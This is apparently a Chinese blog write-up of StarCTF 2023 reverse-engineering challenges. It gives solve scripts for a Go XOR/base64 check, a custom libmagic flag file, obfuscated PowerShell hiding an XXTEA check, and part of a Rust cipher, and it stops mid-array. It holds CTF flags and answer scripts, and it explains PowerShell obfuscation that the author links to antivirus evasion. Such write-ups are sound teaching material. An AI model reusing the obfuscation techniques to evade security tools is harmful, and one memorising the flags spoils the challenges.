Magisk","categories":[],"tags":[{"name":"root","slug":"root","permalink":"https://oacia.dev/tags/root/"},{"name":"pixel3","slug":"pixel3","permalink":"https://oacia.dev/tags/pixel3/"}]},{"title":"StarCTF2023 逆向writeup","slug":"starctf-writeup","date":"2023-07-31T11:13:07.000Z","updated":"2025-04-08T18:55:11.955Z","comments":true,"path":"starctf-writeup/","link":"","permalink":"https://oacia.dev/starctf-writeup/","excerpt":"","text":"前两天刚打完的 starctf, 可真是坐牢呀，比赛期间出了三题，赛后终于又弄出来了一题. GoGpt 就是常规的 go 语言逆向，看题目描述，题目是 chatGPT 出的，哈哈 AI 竟然也能出题了，不过终究还是简单题呀～ flagfile 这题有点意思，用了 linux 中的 file -m 命令可以自定义 magic file 的特点，来检测一个文件的每一个字节是否符合魔数文件中的规则的匹配，来判断是否为正确的 flag, 做完这题之后猛然发现，原来有规则的地方就有逆向！ ez_code 用到了 powershell 特殊符号混淆，多亏看雪上的一篇文章，看到下面的一条评论 大家好好学习一番，说不定哪次ctf就来这种。 简直蚌埠住了，这种混淆一般都是为了免杀，不知道下次遇到别的混淆还能不能做出来，不过基本上都是万变不离其宗的～ boring cipher 可真是做的折磨，rust 逆向还好，毕竟经历了过去许多 go 逆向的非人的折磨，看到 rust 和 go 相比简直就是小巫见大巫了，于是很快就把正向代码给写出来了，接下来的任务就是去写逆向脚本，一开始我向区区逆向脚本，看我直接从正向代码给逆推出来！然后发现… 可恶，根本就没有可逆的点！后来想起来神奇的 z3 , 我直接 z3 把这题一把梭了，虽说恶补了许多许多的 z3 小技巧，然而并没有什么用… 我一度以为是 z3 脚本运行的时间不够，所以等呀等呀，知道这脚本把我 C 盘空间耗尽了还没有出，后来我转战虚拟机，在虚拟机里面跑这个代码，一直盯着电脑屏幕到凌晨六点，还是出不了 flag/(ㄒ o ㄒ)/~ 崩溃啊。在 starctf 结束后的那一天，我又看了一整天的 boring cipher , 终于我发现了正向代码中那个超大的常数数组似乎另有玄机，一番分析之后，终于出 flag 了 题目附件: 点击下载 # GoGpt IDA 打开，发现从 0x45FE80 开始的汇编没有识别出来 那就按下 Alt+L 选中没有识别出来的地方，然后按下 C 对 .text 段重新识别 然后用 IDAGolangHelper_SupportGo1.20 恢复一下函数符号 找到 main_main 函数，发现是简单的异或 + base64 动调发现异或的字符串是有变化的 exp 如下 import base64str = b\"fiAGBkgXN3McFy9hAHRfCwYaIjQCRDFsXC8ZYBFmEDU=\"# xor_str = b\"cH@t_GpT_15_h3R3\"xor_str = b\"TcR@3t_3hp_5_G1H\"ss = base64.b64decode(str)# print(ss)for index,ch in enumerate(ss): print(chr(ch^xor_str[index%16]),end='') # *CTF&#123;ch@tgpT_3nCRypt10n_4_FUN!!&#125;# flagfile 先看一下看一眼附件中的 readme.txt generate your own flag file, verify using `file` command like this:$ file -m flag.mgc flagflag: yes, it's a flag!$ file --versionfile-5.41magic file from /usr/share/file/magic那看看 file -m 是命令是什么意思，原来可以自己写规则来匹配那些文件是什么类型的 oacia@oacia-virtual-machine:~/Desktop/flagfile$ file --helpUsage: file [OPTION...] [FILE...]Determine type of FILEs. --help display this help and exit -v, --version output version information and exit -m, --magic-file LIST use LIST as a colon-separated list of magic number files然后去 github 把 file5.4.1 的源代码下过来看看 关键需要看懂 file.h 里面对于结构体 magic 的定义 union VALUETYPE &#123; uint8_t b; uint16_t h; uint32_t l; uint64_t q; uint8_t hs[2]; /* 2 bytes of a fixed-endian \"short\" */ uint8_t hl[4]; /* 4 bytes of a fixed-endian \"long\" */ uint8_t hq[8]; /* 8 bytes of a fixed-endian \"quad\" */ char s[MAXstring]; /* the search string or regex pattern */ unsigned char us[MAXstring]; uint64_t guid[2]; float f; double d;&#125;;struct magic &#123; /* Word 1 */ uint16_t cont_level; /* level of \">\" */ uint8_t flag;#define INDIR 0x01 /* if '(...)' appears */#define OFFADD 0x02 /* if '>&amp;' or '>...(&amp;' appears */#define INDIROFFADD 0x04 /* if '>&amp;(' appears */#define UNSIGNED 0x08 /* comparison is unsigned */#define NOSPACE 0x10 /* suppress space character before output */#define BINTEST 0x20 /* test is for a binary type (set only for top-level tests) */#define TEXTTEST 0x40 /* for passing to file_softmagic */#define OFFNEGATIVE 0x80 /* relative to the end of file */ uint8_t factor; /* Word 2 */ uint8_t reln; /* relation (0=eq, '>'=gt, etc) */ uint8_t vallen; /* length of string value, if any */ uint8_t type; /* comparison type (FILE_*) */ uint8_t in_type; /* type of indirection */#define FILE_INVALID 0#define FILE_BYTE 1#define FILE_SHORT 2#define FILE_DEFAULT 3#define FILE_LONG 4#define FILE_STRING 5#define FILE_DATE 6#define FILE_BESHORT 7#define FILE_BELONG 8#define FILE_BEDATE 9#define FILE_LESHORT 10#define FILE_LELONG 11#define FILE_LEDATE 12#define FILE_PSTRING 13#define FILE_LDATE 14#define FILE_BELDATE 15#define FILE_LELDATE 16#define FILE_REGEX 17#define FILE_BESTRING16 18#define FILE_LESTRING16 19#define FILE_SEARCH 20#define FILE_MEDATE 21#define FILE_MELDATE 22#define FILE_MELONG 23#define FILE_QUAD 24#define FILE_LEQUAD 25#define FILE_BEQUAD 26#define FILE_QDATE 27#define FILE_LEQDATE 28#define FILE_BEQDATE 29#define FILE_QLDATE 30#define FILE_LEQLDATE 31#define FILE_BEQLDATE 32#define FILE_FLOAT 33#define FILE_BEFLOAT 34#define FILE_LEFLOAT 35#define FILE_DOUBLE 36#define FILE_BEDOUBLE 37#define FILE_LEDOUBLE 38#define FILE_BEID3 39#define FILE_LEID3 40#define FILE_INDIRECT 41#define FILE_QWDATE 42#define FILE_LEQWDATE 43#define FILE_BEQWDATE 44#define FILE_NAME 45#define FILE_USE 46#define FILE_CLEAR 47#define FILE_DER 48#define FILE_GUID 49#define FILE_OFFSET 50#define FILE_BEVARINT 51#define FILE_LEVARINT 52#define FILE_NAMES_SIZE 53 /* size of array to contain all names */#define IS_STRING(t) \\ ((t) == FILE_STRING || \\ (t) == FILE_PSTRING || \\ (t) == FILE_BESTRING16 || \\ (t) == FILE_LESTRING16 || \\ (t) == FILE_REGEX || \\ (t) == FILE_SEARCH || \\ (t) == FILE_INDIRECT || \\ (t) == FILE_NAME || \\ (t) == FILE_USE)#define FILE_FMT_NONE 0#define FILE_FMT_NUM 1 /* \"cduxXi\" */#define FILE_FMT_STR 2 /* \"s\" */#define FILE_FMT_QUAD 3 /* \"ll\" */#define FILE_FMT_FLOAT 4 /* \"eEfFgG\" */#define FILE_FMT_DOUBLE 5 /* \"eEfFgG\" */ /* Word 3 */ uint8_t in_op; /* operator for indirection */ uint8_t mask_op; /* operator for mask */#ifdef ENABLE_CONDITIONALS uint8_t cond; /* conditional type */#else uint8_t dummy;#endif uint8_t factor_op;#define FILE_FACTOR_OP_PLUS '+'#define FILE_FACTOR_OP_MINUS '-'#define FILE_FACTOR_OP_TIMES '*'#define FILE_FACTOR_OP_DIV '/'#define FILE_FACTOR_OP_NONE '\\0'#define FILE_OPS \"&amp;|^+-*/%\"#define FILE_OPAND 0#define FILE_OPOR 1#define FILE_OPXOR 2#define FILE_OPADD 3#define FILE_OPMINUS 4#define FILE_OPMULTIPLY 5#define FILE_OPDIVIDE 6#define FILE_OPMODULO 7#define FILE_OPS_MASK 0x07 /* mask for above ops */#define FILE_UNUSED_1 0x08#define FILE_UNUSED_2 0x10#define FILE_OPSIGNED 0x20#define FILE_OPINVERSE 0x40#define FILE_OPINDIRECT 0x80#ifdef ENABLE_CONDITIONALS#define COND_NONE 0#define COND_IF 1#define COND_ELIF 2#define COND_ELSE 3#endif /* ENABLE_CONDITIONALS */ /* Word 4 */ int32_t offset; /* offset to magic number */ /* Word 5 */ int32_t in_offset; /* offset from indirection */ /* Word 6 */ uint32_t lineno; /* line number in magic file */ /* Word 7,8 */ union &#123; uint64_t _mask; /* for use with numeric and date types */ struct &#123; uint32_t _count; /* repeat/line count */ uint32_t _flags; /* modifier flags */ &#125; _s; /* for use with string types */ &#125; _u;#define num_mask _u._mask#define str_range _u._s._count#define str_flags _u._s._flags /* Words 9-24 */ union VALUETYPE value; /* either number or string */ /* Words 25-40 */ char desc[MAXDESC]; /* description */ /* Words 41-60 */ char mimetype[MAXMIME]; /* MIME type */ /* Words 61-62 */ char apple[8]; /* APPLE CREATOR/TYPE */ /* Words 63-78 */ char ext[64]; /* Popular extensions */&#125;;用 010editor 看一下 flag.mgc , 我们需要做是就是将 flag.mgc 中的字节和结构体 magic 中的结构体成员一一对应起来，然后分析每一个字节对应的含义 我们要从 0x178 处为偏移去读取大小为 sizeof(struct magic) 的内存，如果说怎么知道的话，你看这个字符串 flag&#123; 是否特别突出，然后从 0x178 开始的一个 word 才不全为 0, 能不让人遐想这偏移不是从这儿开始的嘛～ int main()&#123; FILE *fp = fopen(\"./flag.mgc\",\"rb\"); struct magic buffer[100]; fseek(fp,0x178,SEEK_SET); fread(buffer,sizeof(struct magic),0x42,fp);&#125;于是乎， buffer 就包含了这个 flag.mgc 的所有的重要内容，我们打印一下内容看看 void print_buffer(struct magic buffer,int index)&#123; printf(\"buffer[%d]->cont_level = 0x%x\\n\",index,buffer.cont_level); printf(\"buffer[%d]->flag = 0x%x\\n\",index,buffer.flag); printf(\"buffer[%d]->factor = 0x%x\\n\",index,buffer.factor); printf(\"buffer[%d]->reln = 0x%x\\n\",index,buffer.reln); printf(\"buffer[%d]->vallen = 0x%x\\n\",index,buffer.vallen); printf(\"buffer[%d]->type = 0x%x\\n\",index,buffer.type); printf(\"buffer[%d]->in_type = 0x%x\\n\",index,buffer.in_type); printf(\"buffer[%d]->in_op = 0x%x\\n\",index,buffer.in_op); printf(\"buffer[%d]->mask_op = 0x%x\\n\",index,buffer.mask_op); printf(\"buffer[%d]->dummy = 0x%x\\n\",index,buffer.dummy); printf(\"buffer[%d]->factor_op = 0x%x\\n\",index,buffer.factor_op); printf(\"buffer[%d]->offset = 0x%x\\n\",index,buffer.offset); printf(\"buffer[%d]->in_offset = 0x%x\\n\",index,buffer.in_offset); printf(\"buffer[%d]->lineno = 0x%x\\n\",index,buffer.lineno); printf(\"buffer[%d]->num_mask = 0x%x\\n\",index,buffer.num_mask); printf(\"buffer[%d]->str_range = 0x%x\\n\",index,buffer.str_range); printf(\"buffer[%d]->str_flags = 0x%x\\n\",index,buffer.str_flags); if(buffer.type==5)&#123; printf(\"buffer[%d]->value = \\\"%s\\\"\\n\",index,buffer.value); &#125; else&#123; printf(\"buffer[%d]->value = 0x%x\\n\",index,buffer.value); &#125; printf(\"buffer[%d]->desc = \\\"%s\\\"\\n\",index,buffer.desc); printf(\"buffer[%d]->mimetype = \\\"%s\\\"\\n\",index,buffer.mimetype); printf(\"buffer[%d]->apple = \\\"%s\\\"\\n\",index,buffer.apple); printf(\"buffer[%d]->ext = \\\"%s\\\"\\n\\n\",index,buffer.ext);&#125;挑几个有代表性的分析一下 member 说明 buffer[0] buffer[1] buffer[33] cont_level level of “&gt;” 0x0 0x1 0x21 flag 0x0 表示无特殊情况，0x1 表示’(…)' 出现在规则中 0x20 0x0 0x1 factor 0x0 0x0 0x0 reln relation (0=eq, ‘&gt;’=gt, etc), = = = vallen 如果类型为字符串， vallen 表示字符串的长度 0x5 0x0 0x0 type comparison type (FILE_*),0x5 代表 FILE_STRING (字符串类型),0xa 代表 FILE_LESHORT (short 类型，占用 2 字节),0x1 代表 FILE_BYTE (byte 类型，占用 1 字节) 0x5 0xa 0x1 in_type type of indirection, 即间接引用的数据的类型，0x1 代表间接引用的数据类型为 FILE_BYTE (byte 类型，占用 1 字节) 0x0 0x0 0x1 in_op operator for indirection 0x0 0x0 0x0 mask_op operator for mask, 对照结构体定义，0x2 表示 FILE_OPXOR , 即异或操作 0x0 0x2 0x2 dummy 0x0 0x0 0x0 factor_op 0x0 0x0 0x0 offset 相对于 magic number 的偏移 0x0 0x40 0x40 in_offset offset from indirection 0x0 0x0 0x0 lineno line number in magic file 0x1 0x2 0x22 num_mask 存储的值为经过操作符操作之后的数值，如此处对于 buffer [1] 中的数进行了异或操作，那么异或的数即为 0x76 0x0 0x76 0xffffff8a value 存储的是最终要进行数字或字符串比较要用到的值，由于 value 为 union 联合体类型，所以输出数据时首先要通过 type 来判断存储的数值的类型是什么，然后再进行输出 “flag{” 0x6f 0xec desc “” “” “” mimetype “” “” “” apple “” “” “” 由此我们便知道了 buffer[1]~buffer[32] 的作用是为为一块内存地址赋值 对于 buffer[1] , 这条规则规定了 memory[buffer[1].offset]^buffer[1].num_mask=buffer[1].value.h 而对于 buffer[33]~buffer[64] , 由于间接引用类型 buffer[33].in_type 是 0x1 , 所以我们必须思考是哪个地方使用了间接引用，我们注意到它的 buffer[33].flag 值为 0x1 , 说明了存在 (...) , 那么括号内即被间接调用的数据，还记得我们曾在 buffer[1]~buffer[32] 为一块内存地址赋过值，所以现在这里就要收回上面埋下的伏笔，间接引用的就是那块内存中的值，而且我们注意到 buffer[1].offset==buffer[33].offset==0x40 , 假想如果偏移都不一样，怎么可能会取到相对应的值呢？而它的作用就是和最终的 flag 的每一位进行比较，所以规则是这样的: buffer[33].value.b^buffer[33].num_mask==flag[memory[buffer[33].offset]] , 以此来判断 flag 是否正确 分析完毕之后，我们就可以写出 exp 来了 #include&lt;stdio.h>#ifndef __int8_t_defined # define __int8_t_defined typedef signed char int8_t; typedef short int int16_t; typedef int int32_t; # if __WORDSIZE == 64 typedef long int int64_t; # else __extension__ typedef long long int int64_t; # endif #endif typedef unsigned char uint8_t; typedef unsigned short int uint16_t; #ifndef __uint32_t_defined typedef unsigned int uint32_t; # define __uint32_t_defined #endif #if __WORDSIZE == 64 typedef unsigned long int uint64_t; #else __extension__ typedef unsigned long long int uint64_t; #endif#define MAXDESC 64 /* max len of text description/MIME type */#define MAXMIME 80 /* max len of text MIME type */#define MAXstring 128 /* max len of \"string\" types */#define MAGIC_SETS 2union VALUETYPE &#123; uint8_t b; uint16_t h; uint32_t l; uint64_t q; uint8_t hs[2]; /* 2 bytes of a fixed-endian \"short\" */ uint8_t hl[4]; /* 4 bytes of a fixed-endian \"long\" */ uint8_t hq[8]; /* 8 bytes of a fixed-endian \"quad\" */ char s[MAXstring]; /* the search string or regex pattern */ unsigned char us[MAXstring]; uint64_t guid[2]; float f; double d;&#125;;struct magic &#123; /* Word 1 */ uint16_t cont_level; /* level of \">\" */ uint8_t flag;#define INDIR 0x01 /* if '(...)' appears */#define OFFADD 0x02 /* if '>&amp;' or '>...(&amp;' appears */#define INDIROFFADD 0x04 /* if '>&amp;(' appears */#define UNSIGNED 0x08 /* comparison is unsigned */#define NOSPACE 0x10 /* suppress space character before output */#define BINTEST 0x20 /* test is for a binary type (set only for top-level tests) */#define TEXTTEST 0x40 /* for passing to file_softmagic */#define OFFNEGATIVE 0x80 /* relative to the end of file */ uint8_t factor; /* Word 2 */ uint8_t reln; /* relation (0=eq, '>'=gt, etc) */ uint8_t vallen; /* length of string value, if any */ uint8_t type; /* comparison type (FILE_*) */ uint8_t in_type; /* type of indirection */#define FILE_INVALID 0#define FILE_BYTE 1#define FILE_SHORT 2#define FILE_DEFAULT 3#define FILE_LONG 4#define FILE_STRING 5#define FILE_DATE 6#define FILE_BESHORT 7#define FILE_BELONG 8#define FILE_BEDATE 9#define FILE_LESHORT 10#define FILE_LELONG 11#define FILE_LEDATE 12#define FILE_PSTRING 13#define FILE_LDATE 14#define FILE_BELDATE 15#define FILE_LELDATE 16#define FILE_REGEX 17#define FILE_BESTRING16 18#define FILE_LESTRING16 19#define FILE_SEARCH 20#define FILE_MEDATE 21#define FILE_MELDATE 22#define FILE_MELONG 23#define FILE_QUAD 24#define FILE_LEQUAD 25#define FILE_BEQUAD 26#define FILE_QDATE 27#define FILE_LEQDATE 28#define FILE_BEQDATE 29#define FILE_QLDATE 30#define FILE_LEQLDATE 31#define FILE_BEQLDATE 32#define FILE_FLOAT 33#define FILE_BEFLOAT 34#define FILE_LEFLOAT 35#define FILE_DOUBLE 36#define FILE_BEDOUBLE 37#define FILE_LEDOUBLE 38#define FILE_BEID3 39#define FILE_LEID3 40#define FILE_INDIRECT 41#define FILE_QWDATE 42#define FILE_LEQWDATE 43#define FILE_BEQWDATE 44#define FILE_NAME 45#define FILE_USE 46#define FILE_CLEAR 47#define FILE_DER 48#define FILE_GUID 49#define FILE_OFFSET 50#define FILE_BEVARINT 51#define FILE_LEVARINT 52#define FILE_NAMES_SIZE 53 /* size of array to contain all names */#define IS_STRING(t) \\ ((t) == FILE_STRING || \\ (t) == FILE_PSTRING || \\ (t) == FILE_BESTRING16 || \\ (t) == FILE_LESTRING16 || \\ (t) == FILE_REGEX || \\ (t) == FILE_SEARCH || \\ (t) == FILE_INDIRECT || \\ (t) == FILE_NAME || \\ (t) == FILE_USE)#define FILE_FMT_NONE 0#define FILE_FMT_NUM 1 /* \"cduxXi\" */#define FILE_FMT_STR 2 /* \"s\" */#define FILE_FMT_QUAD 3 /* \"ll\" */#define FILE_FMT_FLOAT 4 /* \"eEfFgG\" */#define FILE_FMT_DOUBLE 5 /* \"eEfFgG\" */ /* Word 3 */ uint8_t in_op; /* operator for indirection */ uint8_t mask_op; /* operator for mask */#ifdef ENABLE_CONDITIONALS uint8_t cond; /* conditional type */#else uint8_t dummy;#endif uint8_t factor_op;#define FILE_FACTOR_OP_PLUS '+'#define FILE_FACTOR_OP_MINUS '-'#define FILE_FACTOR_OP_TIMES '*'#define FILE_FACTOR_OP_DIV '/'#define FILE_FACTOR_OP_NONE '\\0'#define FILE_OPS \"&amp;|^+-*/%\"#define FILE_OPAND 0#define FILE_OPOR 1#define FILE_OPXOR 2#define FILE_OPADD 3#define FILE_OPMINUS 4#define FILE_OPMULTIPLY 5#define FILE_OPDIVIDE 6#define FILE_OPMODULO 7#define FILE_OPS_MASK 0x07 /* mask for above ops */#define FILE_UNUSED_1 0x08#define FILE_UNUSED_2 0x10#define FILE_OPSIGNED 0x20#define FILE_OPINVERSE 0x40#define FILE_OPINDIRECT 0x80#ifdef ENABLE_CONDITIONALS#define COND_NONE 0#define COND_IF 1#define COND_ELIF 2#define COND_ELSE 3#endif /* ENABLE_CONDITIONALS */ /* Word 4 */ int32_t offset; /* offset to magic number */ /* Word 5 */ int32_t in_offset; /* offset from indirection */ /* Word 6 */ uint32_t lineno; /* line number in magic file */ /* Word 7,8 */ union &#123; uint64_t _mask; /* for use with numeric and date types */ struct &#123; uint32_t _count; /* repeat/line count */ uint32_t _flags; /* modifier flags */ &#125; _s; /* for use with string types */ &#125; _u;#define num_mask _u._mask#define str_range _u._s._count#define str_flags _u._s._flags /* Words 9-24 */ union VALUETYPE value; /* either number or string */ /* Words 25-40 */ char desc[MAXDESC]; /* description */ /* Words 41-60 */ char mimetype[MAXMIME]; /* MIME type */ /* Words 61-62 */ char apple[8]; /* APPLE CREATOR/TYPE */ /* Words 63-78 */ char ext[64]; /* Popular extensions */&#125;;int main()&#123; char flag[1000],flag_index[1000]; FILE *fp = fopen(\"./flag.mgc\",\"rb\"); struct magic buffer[100]; fseek(fp,0x178,SEEK_SET); fread(buffer,sizeof(struct magic),0x42,fp); int xor_val = 0; for(int i=0;i&lt;0x42;i++)&#123; //printf (\"% d\\n\",buffer [i].mask_op);// 输出全是 2, 对照 mask_op, 可知是异或操作 if(buffer[i].mask_op)&#123; xor_val = buffer[i]._u._mask&amp;0xff; &#125; else&#123; xor_val = 0; &#125; switch(buffer[i].type)&#123; case FILE_BYTE: //printf(\"8%c\\n\",buffer[i].value.b); flag[flag_index[buffer[i].offset]] = buffer[i].value.b^xor_val; break; case FILE_SHORT: case FILE_BESHORT: case FILE_LESHORT: //printf(\"16%c\\n\",buffer[i].value.h); flag_index[buffer[i].offset] = buffer[i].value.h^xor_val; break; case FILE_DATE: case FILE_BEDATE: case FILE_LEDATE: case FILE_MEDATE: case FILE_LDATE: case FILE_BELDATE: case FILE_LELDATE: case FILE_MELDATE: case FILE_LONG: case FILE_BELONG: case FILE_LELONG: case FILE_MELONG: case FILE_FLOAT: case FILE_BEFLOAT: case FILE_LEFLOAT: printf(\"32%c\",buffer[i].value.l); break; case FILE_QUAD: case FILE_BEQUAD: case FILE_LEQUAD: case FILE_QDATE: case FILE_QLDATE: case FILE_QWDATE: case FILE_BEQDATE: case FILE_BEQLDATE: case FILE_BEQWDATE: case FILE_LEQDATE: case FILE_LEQLDATE: case FILE_LEQWDATE: case FILE_DOUBLE: case FILE_BEDOUBLE: case FILE_LEDOUBLE: case FILE_OFFSET: case FILE_BEVARINT: case FILE_LEVARINT: printf(\"%c\",buffer[i].value.q); break; case FILE_STRING: case FILE_PSTRING: case FILE_BESTRING16: case FILE_LESTRING16: case FILE_REGEX: case FILE_SEARCH: case FILE_DEFAULT: case FILE_INDIRECT: case FILE_NAME: case FILE_USE: case FILE_CLEAR: case FILE_DER: case FILE_GUID: //printf(\"%s\\n\",buffer[i].value.s); for(int k=0;k&lt;buffer[i].vallen;k++)&#123; flag[k+buffer[i].offset] = buffer[i].value.s[k]; &#125; break; default: break; &#125; &#125; int len=0; for(int i=0;i&lt;100;i++)&#123; printf(\"%c\",flag[i]); //flag&#123;_oh_yes_you_got_the_flag___^_^__&#125; &#125;&#125;# ez_code 打开题目看到 % , $ 等符号，猜测这是 ps1 的混淆 后缀改成 ps1 运行一下，果然是有输出的 看了一下好像是用 lodan 来混淆的 这篇文章讲的挺好的 https://bbs.kanxue.com/thread-271570.htm, 在 powershell 中， $ 便可以去表示一个变量 +$() 等价于 0, $(@&#123;&#125;) 会得到 System.Collections.Hashtable 对于解释型语言比如 js , python , ps 等等，要是逆向看到这些类型，不论混淆成啥样，把代码扣下来，加个 console.log , print , echo 跑一下，想要知道的变量就全知道了 这题我们就可以用 echo 打印出感兴趣的变量，我们注意到了 iex , [CHar] , 这些在 powershell 中是很重要的存在 随后我们便可以打开 sublime 然后全局替换一下这些奇奇怪怪的特殊符号 把 [CHar] 替换成空字符串，+ 号换成空格，然后丢到厨子里面 得到 ps1 脚本，一眼 xxtea class chiper(): def __init__(self): self.d = 0x87654321 k0 = 0x67452301 k1 = 0xefcdab89 k2 = 0x98badcfe k3 = 0x10325476 self.k = [k0, k1, k2, k3] def e(self, n, v): from ctypes import c_uint32 def MX(z, y, total, key, p, e): temp1 = (z.value >> 6 ^ y.value &lt;&lt; 4) + \\ (y.value >> 2 ^ z.value &lt;&lt; 5) temp2 = (total.value ^ y.value) + \\ (key[(p &amp; 3) ^ e.value] ^ z.value) return c_uint32(temp1 ^ temp2) key = self.k delta = self.d rounds = 6 + 52//n total = c_uint32(0) z = c_uint32(v[n-1]) e = c_uint32(0) while rounds > 0: total.value += delta e.value = (total.value >> 2) &amp; 3 for p in range(n-1): y = c_uint32(v[p+1]) v[p] = c_uint32(v[p] + MX(z, y, total, key, p, e).value).value z.value = v[p] y = c_uint32(v[0]) v[n-1] = c_uint32(v[n-1] + MX(z, y, total, key, n-1, e).value).value z.value = v[n-1] rounds -= 1 return v def bytes2ints(self,cs:bytes)->list: new_length=len(cs)+(8-len(cs)%8)%8 barray=cs.ljust(new_length,b'\\x00') i=0 v=[] while i &lt; new_length: v0 = int.from_bytes(barray[i:i+4], 'little') v1 = int.from_bytes(barray[i+4:i+8], 'little') v.append(v0) v.append(v1) i += 8 return vdef check(instr:str,checklist:list)->int: length=len(instr) if length%8: print(\"Incorrect format.\") exit(1) c=chiper() v = c.bytes2ints(instr.encode()) output=list(c.e(len(v),v)) i=0 while(i&lt;len(checklist)): if i&lt;len(output) and output[i]==checklist[i]: i+=1 else: break if i==len(checklist): return 1 return 0 if __name__==\"__main__\": ans=[1374278842, 2136006540, 4191056815, 3248881376] # generateRes() flag=input('Please input flag:') res=check(flag,ans) if res: print(\"Congratulations, you've got the flag!\") print(\"Flag is *ctf&#123;your_input&#125;!\") exit(0) else: print('Nope,try again!')unction _/==/=__=_&#123; [CmdletBinding()] param( [Parameter(Position = 0)] [String] $param1 ) $result = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($param1)) return $result&#125;Function _\\/_\\_=&#123; [CmdletBinding()] param( [Parameter(Position = 0)] [String] $param1 ) $param1 = _/==/=__=_ -param1 $param1 $result = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($param1)) $result | out-null&#125;_\\/_\\_= (\"S21OMFpudG9hR2hmY0hkemFGOXBjMTlsWVhONVgzSnBaMmgwUDMwPQ==\")echo \"Do you konw PWSH?\"太 easy 了，exp 如下 from ctypes import *def MX(z, y, total, key, p, e): temp1 = (z.value >> 6 ^ y.value &lt;&lt; 4) + \\ (y.value >> 2 ^ z.value &lt;&lt; 5) temp2 = (total.value ^ y.value) + \\ (key[(p &amp; 3) ^ e.value] ^ z.value) return c_uint32(temp1 ^ temp2)def encrypt(n, v, key): delta = 0x87654321 rounds = 6 + 52 // n total = c_uint32(0) z = c_uint32(v[n - 1]) e = c_uint32(0) while rounds > 0: total.value += delta e.value = (total.value >> 2) &amp; 3 for p in range(n - 1): y = c_uint32(v[p + 1]) v[p] = c_uint32(v[p] + MX(z, y, total, key, p, e).value).value z.value = v[p] y = c_uint32(v[0]) v[n - 1] = c_uint32(v[n - 1] + MX(z, y, total, key, n - 1, e).value).value z.value = v[n - 1] rounds -= 1 return vdef decrypt(n, v, key): delta = 0x87654321 rounds = 6 + 52 // n total = c_uint32(rounds * delta) y = c_uint32(v[0]) e = c_uint32(0) while rounds > 0: e.value = (total.value >> 2) &amp; 3 for p in range(n - 1, 0, -1): z = c_uint32(v[p - 1]) v[p] = c_uint32((v[p] - MX(z, y, total, key, p, e).value)).value y.value = v[p] z = c_uint32(v[n - 1]) v[0] = c_uint32(v[0] - MX(z, y, total, key, 0, e).value).value y.value = v[0] total.value -= delta rounds -= 1 return v# testif __name__ == \"__main__\": # 该算法中每次可加密不只 64bit 的数据，并且加密的轮数由加密数据长度决定 v = [1374278842, 2136006540, 4191056815, 3248881376] k = [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476] n = 4 res = decrypt(n, v, k) flag = b'' for i in res: flag += i.to_bytes(4, 'little') print(flag) # yOUar3g0oD@tPw5H# boring cipher ida 动调一下，断点打在这里 上面 obfstr::xref::inner::h7a99f28656c7fd53 是 github 上的开源代码，作用是混淆字符串 还有个文件读取的函数 std::fs::read::inner::hb6a137b36c73a8b4 , 它读取的是 /proc/self/exe , 那么上面的混淆字符串应该就是为了这个文件读取来做掩护的，而这个文件就是题目的这个文件，这也说明了为什么 output 的大小和程序本身的大小是一样的 ​ 面对复杂的加密，从正向开始入手绝对是一个明智的选择 import mathimport numpy as np_arr = [0x0000002A, 0x0000005B, 0x0000007E, 0x000000C1, 0x000000DC, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000002A, 0x0000002C, 0x00000059, 0x0000006F, 0x00000078, 0x0000008E, 0x000000BD, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000001, 0x00000004, 0x0000000E, 0x00000088, 0x0000008B, 0x000000B4, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000038, 0x000000A6, 0x000000AE, 0x000000C3, 0x000000E3, 0x000000E8, 0x000000FF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000013, 0x00000016, 0x00000058, 0x0000005D, 0x00000078, 0x000000AE, 0x000000BB, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000005B, 0x00000089, 0x0000009D, 0x000000B7, 0x000000C5, 0x000000C6, 0x000000F9, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000002, 0x00000016, 0x00000020, 0x00000047, 0x0000008F, 0x00000098, 0x000000CC, 0x000000DF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000015, 0x00000070, 0x000000A8, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000062, 0x00000068, 0x000000C2, 0x000000EA, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000000A, 0x0000000D, 0x0000002F, 0x00000044, 0x00000057, 0x0000007F, 0x000000DB, 0x000000E3, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x0000000B, 0x00000018, 0x00000059, 0x00000086, 0x000000DD, 0x000000FF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 